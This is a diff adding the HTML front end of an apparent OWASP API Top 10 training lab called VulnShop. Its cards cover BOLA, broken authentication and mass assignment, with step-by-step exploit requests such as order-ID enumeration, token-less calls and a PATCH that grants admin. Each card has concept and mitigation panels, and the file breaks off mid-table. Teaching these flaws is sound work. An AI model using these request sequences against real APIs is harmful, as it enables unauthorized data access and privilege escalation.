@@ -1,0 +1,2027 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecurityForge OWASP API Top 10 - Professional Hacking Lab</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 255, 0, 0.05);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(0, 255, 0, 0.3);
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(0, 255, 0, 0.5);
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        body {
+            font-family: 'Roboto Mono', monospace;
+            background: #0a0e27;
+            color: #00ff00;
+            line-height: 1.6;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%2300ff00' fill-opacity='0.05'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+
+        @keyframes scanlines {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(10px); }
+        }
+
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 10px rgba(0, 255, 0, 0.5), inset 0 0 10px rgba(0, 255, 0, 0.1); }
+            50% { box-shadow: 0 0 20px rgba(0, 255, 0, 0.7), inset 0 0 10px rgba(0, 255, 0, 0.2); }
+        }
+
+        @keyframes pulse-red {
+            0%, 100% { color: #ff0000; }
+            50% { color: #ff6666; }
+        }
+
+        .container {
+            max-width: 2000px;
+            margin: 0 auto;
+            padding: 30px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Terminal Style Header */
+        header {
+            background: rgba(10, 14, 39, 0.95);
+            border: 2px solid #00ff00;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3), inset 0 0 20px rgba(0, 255, 0, 0.05);
+            animation: glow 3s ease-in-out infinite;
+            position: relative;
+        }
+
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff00, transparent);
+            animation: flicker 0.15s infinite;
+        }
+
+        header h1 {
+            font-size: 36px;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+            letter-spacing: 3px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        header p {
+            color: #00aa00;
+            font-size: 14px;
+            margin: 5px 0;
+            letter-spacing: 1px;
+        }
+
+        .header-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .info-box {
+            background: rgba(0, 255, 0, 0.05);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            padding: 15px;
+            border-radius: 4px;
+        }
+
+        .info-label {
+            color: #00aa00;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .info-value {
+            color: #00ff00;
+            font-size: 18px;
+            font-weight: 700;
+            margin-top: 8px;
+            text-shadow: 0 0 5px #00ff00;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border: 1px solid rgba(0, 255, 0, 0.2);
+        }
+
+        .tab-button {
+            padding: 12px 20px;
+            background: rgba(0, 255, 0, 0.1);
+            color: #00ff00;
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            cursor: pointer;
+            font-family: 'Roboto Mono', monospace;
+            font-weight: 500;
+            font-size: 13px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .tab-button:hover {
+            background: rgba(0, 255, 0, 0.2);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+            border-color: rgba(0, 255, 0, 0.6);
+        }
+
+        .tab-button.active {
+            background: rgba(0, 255, 0, 0.2);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.7);
+            border-color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        /* Tab Content */
+        .tab-content {
+            display: none;
+            background: rgba(10, 14, 39, 0.9);
+            border: 1px solid rgba(0, 255, 0, 0.2);
+            padding: 30px;
+            box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.05);
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h2 {
+            color: #00ff00;
+            font-size: 28px;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px #00ff00;
+            letter-spacing: 2px;
+            border-bottom: 2px solid rgba(0, 255, 0, 0.3);
+            padding-bottom: 15px;
+        }
+
+        h3 {
+            color: #00ff00;
+            font-size: 18px;
+            margin: 25px 0 15px 0;
+            text-shadow: 0 0 5px #00ff00;
+            letter-spacing: 1px;
+        }
+
+        h4 {
+            color: #00ff00;
+            font-size: 15px;
+            margin: 15px 0 10px 0;
+            letter-spacing: 1px;
+        }
+
+        /* Vulnerability Cards */
+        .vuln-card {
+            background: rgba(0, 20, 40, 0.8);
+            border-left: 4px solid #ff0000;
+            border-right: 1px solid rgba(0, 255, 0, 0.2);
+            border-top: 1px solid rgba(0, 255, 0, 0.1);
+            border-bottom: 1px solid rgba(0, 255, 0, 0.1);
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.2), inset 0 0 10px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s;
+        }
+
+        .vuln-card:hover {
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4), inset 0 0 15px rgba(0, 0, 0, 0.5);
+            transform: translateX(5px);
+            border-left-color: #ff4444;
+        }
+
+        .vuln-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .vuln-id {
+            font-size: 24px;
+            color: #ff0000;
+            font-weight: 700;
+            text-shadow: 0 0 10px #ff0000;
+        }
+
+        .vuln-title {
+            color: #00ff00;
+            font-size: 16px;
+            font-weight: 600;
+            flex: 1;
+            margin-left: 15px;
+        }
+
+        .severity-badge {
+            background: #ff0000;
+            color: #ffffff;
+            padding: 6px 12px;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.6);
+        }
+
+        .cvss-score {
+            color: #ffff00;
+            margin-top: 5px;
+            font-size: 12px;
+        }
+
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .data-item {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 0, 0.15);
+            padding: 15px;
+            border-radius: 3px;
+        }
+
+        .data-label {
+            color: #00aa00;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .data-value {
+            color: #00ff00;
+            font-size: 13px;
+            font-weight: 600;
+            margin-top: 8px;
+            word-break: break-all;
+        }
+
+        /* Code Block */
+        .code-block {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-left: 3px solid #00ff00;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 3px;
+            font-size: 12px;
+            overflow-x: auto;
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .code-block code {
+            color: #00ff00;
+            display: block;
+            line-height: 1.4;
+        }
+
+        /* Attack Steps */
+        .attack-step {
+            background: rgba(0, 0, 0, 0.6);
+            border-left: 3px solid #ffaa00;
+            padding: 15px;
+            margin: 12px 0;
+            border-radius: 3px;
+        }
+
+        .step-number {
+            color: #ffaa00;
+            font-weight: 700;
+            display: inline-block;
+            margin-right: 10px;
+            font-size: 13px;
+        }
+
+        .step-content {
+            color: #c0ff00;
+        }
+
+        /* Expected Response */
+        .response-section {
+            background: rgba(0, 20, 40, 0.7);
+            border: 1px solid rgba(0, 255, 0, 0.25);
+            border-left: 3px solid #ffff00;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 3px;
+        }
+
+        .response-header {
+            color: #ffff00;
+            font-weight: 700;
+            margin-bottom: 10px;
+            font-size: 13px;
+        }
+
+        .response-status {
+            color: #ff0000;
+            font-weight: 700;
+            margin: 8px 0;
+        }
+
+        .exposed-data {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 3px;
+            color: #ff6666;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            font-size: 12px;
+        }
+
+        th {
+            background: rgba(0, 255, 0, 0.1);
+            color: #00ff00;
+            padding: 12px;
+            text-align: left;
+            border-bottom: 2px solid rgba(0, 255, 0, 0.3);
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        td {
+            padding: 10px;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.1);
+            color: #c0ff00;
+        }
+
+        tr:nth-child(even) {
+            background: rgba(0, 255, 0, 0.02);
+        }
+
+        tr:hover {
+            background: rgba(0, 255, 0, 0.08);
+        }
+
+        .payload-box {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            border-left: 3px solid #ff0000;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 3px;
+            color: #ff6666;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* Details / Mitigation panels */
+        .toggle-button {
+            background: transparent;
+            color: #00ff00;
+            border: 1px solid rgba(0,255,0,0.2);
+            padding: 8px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: 'Roboto Mono', monospace;
+            margin-top: 8px;
+        }
+
+        .toggle-button:hover { box-shadow: 0 0 10px rgba(0,255,0,0.2); }
+
+        .details-panel {
+            background: rgba(0,0,0,0.7);
+            border: 1px solid rgba(0,255,0,0.12);
+            padding: 16px;
+            margin: 12px 0 0 0;
+            border-radius: 6px;
+            display: none;
+        }
+
+        .details-panel h4 { color: #00ff00; margin-bottom: 8px; }
+        .metric { color: #c0ff00; font-weight:700; }
+
+        .impact-section {
+            background: rgba(255, 0, 0, 0.08);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            border-left: 3px solid #ff0000;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 3px;
+        }
+
+        .impact-title {
+            color: #ff6666;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .impact-text {
+            color: #ff9999;
+        }
+
+        .successful-exploit {
+            background: rgba(0, 255, 0, 0.05);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-left: 3px solid #00ff00;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 3px;
+            color: #00ff00;
+        }
+
+        footer {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 1px solid rgba(0, 255, 0, 0.2);
+            text-align: center;
+            color: #00aa00;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+
+        @media (max-width: 768px) {
+            header h1 {
+                font-size: 24px;
+            }
+            
+            .vuln-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .data-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header>
+            <h1>⚡ VULNSHOP HACKING LAB ⚡</h1>
+            <p>>> OWASP API Top 10 (2023) Penetration Testing Platform</p>
+            <p>>> Welcome to Professional API Security Research Environment</p>
+            
+            <div class="header-info">
+                <div class="info-box">
+                    <div class="info-label">API Status</div>
+                    <div class="info-value" id="apiStatus">● CHECKING...</div>
+                </div>
+                <div class="info-box">
+                    <div class="info-label">Connected Users</div>
+                    <div class="info-value" id="userCount">0</div>
+                </div>
+                <div class="info-box">
+                    <div class="info-label">Exposed Data</div>
+                    <div class="info-value" id="dataCount">0 RECORDS</div>
+                </div>
+                <div class="info-box">
+                    <div class="info-label">Vulnerabilities</div>
+                    <div class="info-value">10/10 ACTIVE</div>
+                </div>
+            </div>
+        </header>
+        </header>
+
+        <!-- Admin Login for Logs Access -->
+        <div style="margin-bottom:16px; padding:12px; background:rgba(0,0,0,0.6); border:1px solid rgba(0,255,0,0.15); border-radius:6px;">
+            <label style="color:#00ff00; font-weight:700;">🔐 Admin Login (for Audit Logs):</label>
+            <input id="adminEmail" type="text" placeholder="admin@example.com" style="margin-left:8px; width:200px; padding:6px; background:#001000; color:#00ff00; border:1px solid rgba(0,255,0,0.15);" />
+            <input id="adminPassword" type="password" placeholder="password" style="margin-left:6px; width:120px; padding:6px; background:#001000; color:#00ff00; border:1px solid rgba(0,255,0,0.15);" />
+            <button class="toggle-button" style="margin-left:8px;" onclick="adminLogin()">Login</button>
+            <span id="adminLoginStatus" style="margin-left:12px; color:#888; font-size:0.9em;"></span>
+        </div>
+
+        <!-- Instructor Panel (hidden by default) -->
+        <div style="margin-bottom:16px;">
+            <button class="tab-button" id="instructorToggle" onclick="toggleInstructorPanel()">🔧 Instructor Panel</button>
+            <div id="instructorPanel" style="display:none; margin-top:12px; padding:16px; border:1px dashed rgba(0,255,0,0.12); background:rgba(0,0,0,0.6); border-radius:6px;">
+                <label style="color:#00ff00; font-weight:700;">Dataset size multiplier:</label>
+                <input id="datasetMultiplier" type="number" value="1" min="1" style="margin-left:8px; width:80px; background:#001000; color:#00ff00; border:1px solid rgba(0,255,0,0.15); padding:6px;" />
+                <label style="color:#00ff00; font-weight:700; margin-left:16px;">Financial impact multiplier:</label>
+                <input id="financialMultiplier" type="number" value="1" step="0.1" min="0" style="margin-left:8px; width:80px; background:#001000; color:#00ff00; border:1px solid rgba(0,255,0,0.15); padding:6px;" />
+                <button class="toggle-button" style="margin-left:12px;" onclick="applySimulation()">Apply Simulation</button>
+                <button class="toggle-button" style="margin-left:8px;" onclick="resetSimulation()">Reset</button>
+            </div>
+        </div>
+
+        <!-- Tabs -->
+        <div class="tabs">
+            <button class="tab-button active" onclick="switchTab('dashboard')">📊 DASHBOARD</button>
+            <button class="tab-button" onclick="switchTab('api1')">API-1: BOLA</button>
+            <button class="tab-button" onclick="switchTab('api2')">API-2: AUTH</button>
+            <button class="tab-button" onclick="switchTab('api3')">API-3: MASS ASSIGN</button>
+            <button class="tab-button" onclick="switchTab('api4')">API-4: RESOURCE EX</button>
+            <button class="tab-button" onclick="switchTab('api5')">API-5: FUNC AUTH</button>
+            <button class="tab-button" onclick="switchTab('api6')">API-6: BUSILOGIC</button>
+            <button class="tab-button" onclick="switchTab('api7')">API-7: SSRF</button>
+            <button class="tab-button" onclick="switchTab('api8')">API-8: MISC CONFIG</button>
+            <button class="tab-button" onclick="switchTab('api9')">API-9: INVENT</button>
+            <button class="tab-button" onclick="switchTab('api10')">API-10: UNSAFE API</button>
+            <button class="tab-button" onclick="switchTab('logs')" style="margin-left:auto; background:rgba(255,0,0,0.1); border:1px solid rgba(255,0,0,0.3);">🔒 AUDIT LOGS</button>
+        </div>
+
+        <!-- Dashboard Tab -->
+        <div id="dashboard" class="tab-content active">
+            <h2>>>> SYSTEM DASHBOARD <<<</h2>
+            
+            <h3>📊 REAL-TIME DATABASE STATUS</h3>
+            <table>
+                <tr>
+                    <th>ENTITY</th>
+                    <th>COUNT</th>
+                    <th>STATUS</th>
+                    <th>DETAILS</th>
+                </tr>
+                <tr>
+                    <td>USERS</td>
+                    <td id="tableUsers">-</td>
+                    <td style="color: #00ff00;">● CONNECTED</td>
+                    <td>3 profiles loaded</td>
+                </tr>
+                <tr>
+                    <td>PRODUCTS</td>
+                    <td id="tableProducts">-</td>
+                    <td style="color: #00ff00;">● CONNECTED</td>
+                    <td>Real inventory data</td>
+                </tr>
+                <tr>
+                    <td>ORDERS</td>
+                    <td id="tableOrders">-</td>
+                    <td style="color: #00ff00;">● CONNECTED</td>
+                    <td>Transaction logs available</td>
+                </tr>
+            </table>
+
+            <h3>👥 EXTRACTED USERS DATABASE</h3>
+            <table>
+                <tr>
+                    <th>ID</th>
+                    <th>EMAIL</th>
+                    <th>PASSWORD</th>
+                    <th>ROLE</th>
+                    <th>BALANCE</th>
+                </tr>
+                <tbody id="usersTable"></tbody>
+            </table>
+
+            <h3>📦 AVAILABLE PRODUCTS</h3>
+            <table>
+                <tr>
+                    <th>ID</th>
+                    <th>PRODUCT NAME</th>
+                    <th>PRICE ($)</th>
+                    <th>STOCK</th>
+                </tr>
+                <tbody id="productsTable"></tbody>
+            </table>
+
+            <h3>📋 ORDERS HISTORY</h3>
+            <table>
+                <tr>
+                    <th>ORDER ID</th>
+                    <th>USER ID</th>
+                    <th>PRODUCT</th>
+                    <th>QUANTITY</th>
+                    <th>TOTAL ($)</th>
+                    <th>STATUS</th>
+                </tr>
+                <tbody id="ordersTable"></tbody>
+            </table>
+        </div>
+
+        <!-- API 1: BOLA -->
+        <div id="api1" class="tab-content">
+            <h2>🔴 API-1: BROKEN OBJECT LEVEL AUTHORIZATION (BOLA)</h2>
+            
+            <div class="vuln-card">
+                <div class="vuln-header">
+                    <span class="vuln-id">#1</span>
+                    <span class="vuln-title">Access Another User's Sensitive Order Data</span>
+                    <div>
+                        <div class="severity-badge">CRITICAL: 9.1</div>
+                        <div class="cvss-score">CVSS v3.1: Attack/User/Network</div>
+                    </div>
+                </div>
+
+                <h3>[ VULNERABILITY DESCRIPTION ]</h3>
+                <p>The API fails to validate object ownership. Any authenticated user can access other users' orders by changing the order ID parameter.</p>
+
+                <h3>[ EXPLOITATION STEPS ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">STEP 1:</span>
+                    <span class="step-content">Login as ANY user and obtain authentication token</span>
+                </div>
+                <div class="code-block">
+                    <code>POST /api/auth/login
+{
+  "email": "user1@example.com",
+  "password": "Password123"
+}</code>
+                </div>
+
+                <div class="attack-step">
+                    <span class="step-number">STEP 2:</span>
+                    <span class="step-content">Note the JWT token received in response</span>
+                </div>
+
+                <div class="attack-step">
+                    <span class="step-number">STEP 3:</span>
+                    <span class="step-content">Use the token to access ORDER #2 (which belongs to USER #2)</span>
+                </div>
+                <div class="code-block">
+                    <code>GET /api/orders/2
+Headers:
+Authorization: Bearer YOUR_TOKEN_HERE</code>
+                </div>
+
+                <h3>[ POSTMAN TEST COLLECTION ]</h3>
+                <div class="payload-box">
+                    Endpoint: GET /api/orders/2<br>
+                    Method: GET<br>
+                    Auth: Use User1Token<br>
+                    Expected: 200 OK (VULNERABLE!)
+                </div>
+
+                <h3>[ EXPECTED RESPONSE (VULNERABLE) ]</h3>
+                <div class="response-section">
+                    <div class="response-header">HTTP/1.1 200 OK</div>
+                    <div class="response-status">✗ SECURITY FAILURE - Direct access granted!</div>
+                    <div class="exposed-data">
+                        {<br>
+                        &nbsp;&nbsp;"id": 2,<br>
+                        &nbsp;&nbsp;"user_id": 2,<br>
+                        &nbsp;&nbsp;"product_id": 2,<br>
+                        &nbsp;&nbsp;"quantity": 2,<br>
+                        &nbsp;&nbsp;"client_price": 5000,<br>
+                        &nbsp;&nbsp;"status": "CREATED",<br>
+                        &nbsp;&nbsp;"timestamp": 1770283745<br>
+                        }
+                    </div>
+                </div>
+
+                <h3>[ REAL DATA LEAKED ]</h3>
+                <div class="data-grid">
+                    <div class="data-item">
+                        <div class="data-label">Other User's Order</div>
+                        <div class="data-value">Order #2 [COMPROMISED]</div>
+                    </div>
+                    <div class="data-item">
+                        <div class="data-label">Quantity Purchased</div>
+                        <div class="data-value">2 Units</div>
+                    </div>
+                    <div class="data-item">
+                        <div class="data-label">Price Paid</div>
+                        <div class="data-value">$5000 USD</div>
+                    </div>
+                    <div class="data-item">
+                        <div class="data-label">Purchase Status</div>
+                        <div class="data-value">CREATED</div>
+                    </div>
+                </div>
+
+                <h3>[ IMPACT ]</h3>
+                <div class="impact-section">
+                    <div class="impact-title">💥 CRITICAL SECURITY IMPACT:</div>
+                    <div class="impact-text">
+                        ✗ Unauthorized access to other users' financial data<br>
+                        ✗ Complete privacy breach of purchase history<br>
+                        ✗ Pattern analysis of user shopping behavior<br>
+                        ✗ Ability to access ALL orders in system (1, 2, 3, 4...)<br>
+                        ✗ Potential to modify other users' orders
+                    </div>
+                </div>
+
+                <h3>[ TRY THIS ]</h3>
+                <div class="successful-exploit">
+                    FOR TESTING: Try these order IDs in Postman:<br>
+                    GET /api/orders/1 (Admin's order)<br>
+                    GET /api/orders/2 (User2's order)<br>
+                    GET /api/orders/3 (Another user's order)<br>
+                    GET /api/orders/999 (Fuzzing test)<br>
+                    <br>
+                    All will return data WITHOUT permission check!
+                </div>
+                <button class="toggle-button" onclick="toggleDetails('details-api1')">Show Concept & Mitigation</button>
+                <div class="details-panel" id="details-api1" data-records="4" data-revenue="122000">
+                    <h4>Concept</h4>
+                    <p>BOLA occurs when the API fails to check whether the authenticated user owns the object they're requesting. Attackers can enumerate object IDs to retrieve or manipulate other users' data.</p>
+
+                    <h4>Estimated Impact</h4>
+                    <ul>
+                        <li class="metric">Records potentially exposed: 4 orders (current dataset)</li>
+                        <li class="metric">Immediate revenue exposure: ~$122,000 (sample order totals)</li>
+                        <li class="metric">Data sensitivity: Order history, product details, user identifiers</li>
+                    </ul>
+
+                    <h4>Mitigations</h4>
+                    <ol>
+                        <li>Always validate object ownership on server side (check user_id == token user)</li>
+                        <li>Enforce least-privilege and return 403 on mismatch</li>
+                        <li>Implement audit logging for access to sensitive objects</li>
+                    </ol>
+
+                    <h4>Postman Step-by-step</h4>
+                    <div class="code-block" id="payload-api1">GET /api/orders/2
+Headers: Authorization: Bearer &lt;USER1_TOKEN&gt;</div>
+                    <button class="toggle-button" onclick="copyPayload('payload-api1')">Copy Payload</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- AUDIT LOGS TAB (Admin Only) -->
+        <div id="logs" class="tab-content">
+            <h2>>>> AUDIT LOGS & EXPLOIT TRACKING <<<</h2>
+            <p style="color:#ffaa00; margin-bottom:12px;">📋 Real-time log of student exploit attempts and server events</p>
+            
+            <div style="margin-bottom:16px; display:flex; gap:8px; flex-wrap:wrap; align-items:center;">
+                <input type="text" id="logFilter" placeholder="Filter by event type or endpoint..." style="padding:8px; background:rgba(0,255,0,0.05); border:1px solid rgba(0,255,0,0.2); color:#00ff00; width:400px; font-family:monospace;" />
+                <button class="toggle-button" onclick="loadLogs()">🔄 Refresh Logs</button>
+                <button class="toggle-button" onclick="exportLogs()">⬇️ Export CSV</button>
+                <button class="toggle-button" onclick="clearLogFilter()">Clear Filter</button>
+            </div>
+            
+            <table style="width:100%; font-size:0.85em;">
+                <tr>
+                    <th>TIMESTAMP</th>
+                    <th>EVENT TYPE</th>
+                    <th>USER ID</th>
+                    <th>ENDPOINT</th>
+                    <th>CLIENT IP</th>
+                    <th>PAYLOAD / NOTE</th>
+                    <th>STATUS</th>
+                </tr>
+                <tbody id="logsTable" style="max-height:600px; overflow-y:auto;">
+                    <tr><td colspan="7" style="text-align:center; color:#ffaa00;">Loading logs...</td></tr>
+                </tbody>
+            </table>
+            
+            <div style="margin-top:16px; color:#888; font-size:0.8em;">
+                📊 Logs auto-refresh every 10 seconds | 🔐 Admin view only | 📝 All exploit attempts captured
+            </div>
+        </div>
+
+        <!-- API 2: BROKEN AUTHENTICATION -->
+        <div id="api2" class="tab-content">
+            <h2>🔴 API-2: BROKEN AUTHENTICATION</h2>
+            
+            <div class="vuln-card">
+                <div class="vuln-header">
+                    <span class="vuln-id">#2</span>
+                    <span class="vuln-title">Access Protected Resources Without Authentication</span>
+                    <div>
+                        <div class="severity-badge">CRITICAL: 9.1</div>
+                        <div class="cvss-score">CVSS v3.1: No Auth Required</div>
+                    </div>
+                </div>
+
+                <h3>[ VULNERABILITY DESCRIPTION ]</h3>
+                <p>Multiple endpoints accept requests without valid JWT tokens. Authentication bypass allows complete API access.</p>
+
+                <h3>[ TEST 1: ACCESS PRODUCTS WITHOUT TOKEN ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">STEP 1:</span>
+                    <span class="step-content">Send GET request to /api/products with NO authentication</span>
+                </div>
+                <div class="code-block">
+                    <code>GET /api/products
+Headers: (NO Authorization header!)
+
+Expected RESULT: 200 OK - Data leaked!</code>
+                </div>
+
+                <h3>[ EXPOSED DATA ]</h3>
+                <div class="exposed-data">
+                    All products accessible without login:<br>
+                    - Product IDs<br>
+                    - Pricing information<br>
+                    - Stock levels<br>
+                    - Product descriptions
+                </div>
+
+                <h3>[ TEST 2: CREATE ORDER WITHOUT TOKEN ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">STEP 1:</span>
+                    <span class="step-content">Try to create order without authentication</span>
+                </div>
+                <div class="code-block">
+                    <code>POST /api/orders
+Headers: (NO Authorization!)
+Body: {"product_id": 2, "quantity": 5}</code>
+                </div>
+
+                <h3>[ IMPACT ]</h3>
+                <div class="impact-section">
+                    <div class="impact-title">💥 AUTHENTICATION BYPASS:</div>
+                    <div class="impact-text">
+                        ✗ Complete API access without valid credentials<br>
+                        ✗ Any attacker can perform all operations<br>
+                        ✗ Orders can be created as any user<br>
+                        ✗ Database can be accessed freely
+                    </div>
+                </div>
+
+                <h3>[ POSTMAN TEST ]</h3>
+                <div class="payload-box">
+                    Method: GET<br>
+                    URL: GET /api/products<br>
+                    Headers: NONE (remove Authorization)<br>
+                    Expected: 200 OK
+                </div>
+                <button class="toggle-button" onclick="toggleDetails('details-api2')">Show Concept & Mitigation</button>
+                <div class="details-panel" id="details-api2" data-records="50" data-revenue="0">
+                    <h4>Concept</h4>
+                    <p>Broken Authentication means endpoints do not properly require or validate credentials. Attackers can access protected resources without valid tokens.</p>
+
+                    <h4>Estimated Impact</h4>
+                    <ul>
+                        <li class="metric">Records exposed: Products, potentially orders</li>
+                        <li class="metric">Ability to create orders: unauthorized</li>
+                        <li class="metric">Business impact: fraudulent orders, data leakage</li>
+                    </ul>
+
+                    <h4>Mitigations</h4>
+                    <ol>
+                        <li>Require authentication for all sensitive endpoints</li>
+                        <li>Validate JWT signature and expiration server-side</li>
+                        <li>Implement short-lived tokens and rotation</li>
+                    </ol>
+
+                    <h4>Postman Step-by-step</h4>
+                    <div class="code-block" id="payload-api2">GET /api/products (no Authorization header)</div>
+                    <button class="toggle-button" onclick="copyPayload('payload-api2')">Copy Payload</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- API 3: MASS ASSIGNMENT -->
+        <div id="api3" class="tab-content">
+            <h2>🔴 API-3: BROKEN OBJECT PROPERTY-LEVEL AUTHORIZATION (MASS ASSIGNMENT)</h2>
+            
+            <div class="vuln-card">
+                <div class="vuln-header">
+                    <span class="vuln-id">#3</span>
+                    <span class="vuln-title">Become Admin User - Privilege Escalation</span>
+                    <div>
+                        <div class="severity-badge">CRITICAL: 8.7</div>
+                        <div class="cvss-score">CVSS v3.1: Privilege Escalation</div>
+                    </div>
+                </div>
+
+                <h3>[ VULNERABILITY DESCRIPTION ]</h3>
+                <p>API accepts arbitrary properties in PATCH requests without validation. Users can modify their own role to "admin".</p>
+
+                <h3>[ EXPLOITATION STEPS ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">STEP 1:</span>
+                    <span class="step-content">Login as regular User1</span>
+                </div>
+                <div class="code-block">
+                    <code>POST /api/auth/login
+{
+  "email": "user1@example.com",
+  "password": "Password123"
+}</code>
+                </div>
+
+                <div class="attack-step">
+                    <span class="step-number">STEP 2:</span>
+                    <span class="step-content">Update your profile with ADMIN role</span>
+                </div>
+                <div class="code-block">
+                    <code>PATCH /api/users/1
+Headers: Authorization: Bearer YOUR_TOKEN
+Body:
+{
+  "is_admin": true,
+  "role": "admin"
+}</code>
+                </div>
+
+                <div class="attack-step">
+                    <span class="step-number">STEP 3:</span>
+                    <span class="step-content">Now access admin endpoints</span>
+                </div>
+                <div class="code-block">
+                    <code>GET /api/admin/users
+Headers: Authorization: Bearer YOUR_TOKEN
+(Now you have admin access!)</code>
+                </div>
+
+                <h3>[ BEFORE/AFTER ]</h3>
+                <table>
+                    <tr>
+                        <th>FIELD</th>
+                        <th>BEFORE EXPLOIT</th>
+                        <th>AFTER EXPLOIT</th>
+                    </tr>
+                    <tr>
+                        <td>Role</td>
+                        <td style="color: #ffaa00;">user</td>
+                        <td style="color: #ff6666;">admin</td>
+                    </tr>
+                    <tr>
+                        <td>Is Admin</td>
+                        <td style="color: #ffaa00;">false</td>
+                        <td style="color: #ff6666;">true</td>
+                    </tr>
+                    <tr>
+                        <td>Access Level</td>
+                        <td style="color: #ffaa00;">Limited</td>
